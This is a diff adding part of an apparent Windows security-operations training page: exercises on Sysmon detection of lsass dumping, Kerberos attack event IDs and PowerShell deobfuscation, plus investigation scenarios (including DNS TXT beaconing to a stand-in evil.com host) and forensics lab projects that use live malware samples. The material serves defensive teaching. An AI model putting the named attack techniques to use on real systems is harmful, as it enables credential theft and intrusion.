+<li><strong>Sysmon Rule Writing:</strong> Describe how you would configure a Sysmon rule to detect the use of ProcDump or Mimikatz attempting to dump lsass.exe process memory.</li>
+<li><strong>Timeline Reconstruction:</strong> Given a set of Windows Event Logs and Sysmon logs, describe the process for reconstructing a full attack timeline from initial access to data exfiltration.</li>
+<li><strong>Active Directory Security:</strong> List the Event IDs you would monitor to detect each stage of a Kerberos-based attack (Kerberoasting, AS-REP Roasting, Golden Ticket, DCSync).</li>
+<li><strong>PowerShell Forensics:</strong> Explain how to enable PowerShell logging via GPO and how to deobfuscate an encoded PowerShell command that you find in Event ID 4104 logs.</li>
+</ol>
+</div>
+
+<p class="fw-bold" style="color:#00d4ff;">Investigation Scenarios (2)</p>
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<ol style="color:#c0d0e0;">
+<li><strong>Scenario:</strong> You notice Event ID 7045 (service installation) on 5 servers within 2 minutes. All services are named "UpdateService" with binary path "C:\Windows\Temp\svchost.exe". No change control tickets exist for these changes. Walk through your investigation.</li>
+<li><strong>Scenario:</strong> Sysmon Event ID 22 (DNSEvent) shows svchost.exe on DC-01 querying "base64encodedstring.evil.com" every 5 minutes. The query type is TXT. Walk through your response.</li>
+</ol>
+</div>
+
+<p class="fw-bold" style="color:#00d4ff;">Interview Questions (3)</p>
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<ol style="color:#c0d0e0;">
+<li>"Explain the complete Windows logon process, including the difference between interactive (Type 2), network (Type 3), and RDP (Type 10) logons, and why each matters for security monitoring."</li>
+<li>"How would you detect a Kerberoasting attack using Windows Event Logs? What specific Event IDs and fields would you look for?"</li>
+<li>"Walk me through how you would configure a new Windows 10 endpoint for maximum forensic visibility (tools, logs, configurations)."</li>
+</ol>
+</div>
+
+<!-- PORTFOLIO PROJECTS -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-folder me-2"></i>Portfolio Projects</h5>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-1-circle me-1"></i> Beginner Project: Windows Log Analysis Dashboard (PowerShell + HTML)</p>
+<p style="color:#c0d0e0;"><strong>Objective:</strong> Build a PowerShell script that collects key security events (4624, 4625, 4688, 7045) from multiple Windows hosts via WinRM, and generates an HTML dashboard. Deploy WEF to centralize logs.</p>
+<p style="color:#c0d0e0;"><strong>Architecture:</strong> PowerShell → Get-WinEvent (remote) → Parse → HTML report with Bootstrap styling.</p>
+<p style="color:#c0d0e0;"><strong>Tools:</strong> PowerShell, WinRM, HTML/CSS.</p>
+<p style="color:#c0d0e0;"><strong>Steps:</strong> Enable WinRM → Write collection script → Parse events → Generate Bootstrap HTML → Schedule task → Deploy to lab environment.</p>
+<p style="color:#c0d0e0;"><strong>Documentation:</strong> GitHub repo with script, sample output, WinRM configuration guide, and blog post.</p>
+</div>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-2-circle me-1"></i> Intermediate Project: Sysmon Rule Tuning &amp; Detection Playbook</p>
+<p style="color:#c0d0e0;"><strong>Objective:</strong> Deploy Sysmon across a small AD lab (3 VMs), create custom detection rules for lateral movement (PsExec, WMI, RDP), tune out false positives, and create an incident response playbook.</p>
+<p style="color:#c0d0e0;"><strong>Architecture:</strong> Domain Controller + 2 workstations + Windows Event Collector + Winlogbeat → Elasticsearch + Kibana.</p>
+<p style="color:#c0d0e0;"><strong>Tools:</strong> Sysmon, SwiftOnSecurity config, Winlogbeat, Elastic, Kibana, Atomic Red Team.</p>
+<p style="color:#c0d0e0;"><strong>Steps:</strong> Deploy AD → Install Sysmon with base config → Set up WEF → Ship to Elastic → Generate attacks with Atomic Red Team → Tune rules → Build Kibana dashboards → Write playbooks.</p>
+<p style="color:#c0d0e0;"><strong>Documentation:</strong> Full Sysmon config, detection rules (Sigma), Kibana dashboards, incident response playbooks for PsExec/WMI/RDP.</p>
+</div>
+
+<div class="bg-dark p-3 rounded mb-3" style="border:1px solid #333;">
+<p class="fw-bold" style="color:#00d4ff;"><i class="bi bi-3-circle me-1"></i> Advanced Project: Windows Memory Forensics &amp; Malware Analysis Lab</p>
+<p style="color:#c0d0e0;"><strong>Objective:</strong> Create a complete Windows forensic analysis pipeline: capture RAM during an active infection, analyze with Volatility 3, extract and analyze the malware, and produce a full forensic report with reconstructed timeline.</p>
+<p style="color:#c0d0e0;"><strong>Architecture:</strong> Windows victim VM → RAM capture (AVML/DumpIt) → Linux analysis VM → Volatility 3 + YARA + Ghidra.</p>
+<p style="color:#c0d0e0;"><strong>Tools:</strong> AVML, Volatility 3, YARA, Ghidra/IDA Free, Python, KAPE, Zimmerman's Tools.</p>
+<p style="color:#c0d0e0;"><strong>Steps:</strong> Set up victim VM with vulnerable services → Infect with malware (use MalwareBazaar samples) → Capture RAM → Analyze with Volatility (pslist, malfind, netscan, cmdline) → Extract injected code → Reverse engineer extracted payload → Correlate with event logs → Write comprehensive report.</p>
+<p style="color:#c0d0e0;"><strong>Documentation:</strong> Analysis VM setup guide, Volatility usage with screenshots, malware analysis report template, timeline reconstruction methodology, and findings write-up.</p>
+</div>
+
 </div>
